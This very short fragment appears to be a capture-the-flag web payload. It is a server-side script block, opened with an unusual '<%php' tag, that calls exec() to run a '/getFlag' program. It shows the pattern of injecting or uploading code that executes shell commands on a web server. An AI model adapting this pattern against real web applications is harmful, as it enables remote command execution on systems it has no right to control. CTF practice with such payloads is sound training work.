<%php
exec("/getFlag")
%>
